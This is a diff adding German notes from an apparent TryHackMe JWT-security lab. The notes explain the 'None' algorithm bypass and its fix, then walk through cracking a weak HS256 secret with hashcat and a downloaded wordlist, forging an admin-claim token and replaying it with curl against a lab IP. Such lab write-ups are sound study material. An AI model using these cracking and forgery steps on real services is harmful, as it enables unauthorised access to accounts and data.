@@ -205,3 +205,59 @@ signature_algorithm = header['alg']
 payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
 ```
 
+Wenn der Angreifer jedoch „None“ als Algorithmus angibt, wird die Signaturprüfung umgangen. Pyjwt, die in diesem Raum verwendete JWT-Bibliothek, hat Sicherheitscodierungen implementiert, um dieses Problem zu verhindern. Wenn bei Auswahl des Algorithmus „None“ ein Geheimnis angegeben wird, wird eine Ausnahme ausgelöst.
+
+### Fix 
+
+Wenn mehrere Signaturalgorithmen unterstützt werden sollen, müssen die unterstützten Algorithmen der Dekodierungsfunktion als Array-Liste übergeben werden, wie unten gezeigt:
+
+```
+payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])
+
+username = payload['username'] 
+flag = self.db_lookup(username, "flag")
+```
+
+## Weak Symmetric Secrets
+
+Wenn ein symmetrischer Signaturalgorithmus verwendet wird, hängt die Sicherheit des JWT von der Stärke und Entropie des verwendeten Geheimnisses ab. Wenn ein schwaches Geheimnis verwendet wird, kann es möglich sein, das Geheimnis durch Offline-Cracking wiederherzustellen. Sobald der geheime Wert bekannt ist, können Sie die Claims in Ihrem JWT erneut ändern und mit dem Geheimnis eine gültige Signatur neu berechnen.
+
+### Praktisches Beispiel 
+Gegebenheit API via http://10.10.207.144/api/v1.0/example4
+User: user
+Passwort: passwort4
+
+zuerst holen wir uns einmal beim Server unseren JWT für den Bekannten Nutzer mit PW. 
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.10.207.144/api/v1.0/example4
+```
+
+Hier erhalten wir einen Token wie Folgt 
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY`
+
+um hier jetzt das Secret herauszubekommen müssen wir den JWT knacken. Hierzu speichern wir den Token in einer text datei ab, als z.B. jwt.txt. Danach laden wir uns die Passende wordlist noch von Github via: 
+
+`wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`
+
+Jetzt haben wir die 2 wichtigen komponenten nun können wir den JWT via John oder Hashcat knacken
+
+```
+hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
+```
+
+Hier bekommen wir dann heraus das dass secret "secret" ist. Anhand dessen können wir uns nun einen eigenen JWT mit admin claim bauen via jwt.io, indem wir den "admin" wert von 0 auf 1 setzen und dann beim encoder angeben das der JWT mit secret gesigned werden soll. Das resultat sieht dann ungefähr so aus: 
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc`
+
+Diesen Modifizierten JWT können wir dann wieder übermitteln via
+
+```
+curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc"]' http://10.10.207.144/api/v1.0/example4?username=admin
+```
+
+Damit haben wir uns dann als Admin authorisiert und bekommen nun unsere THM Flag
+
+## Signature Algorithm Confusion
+
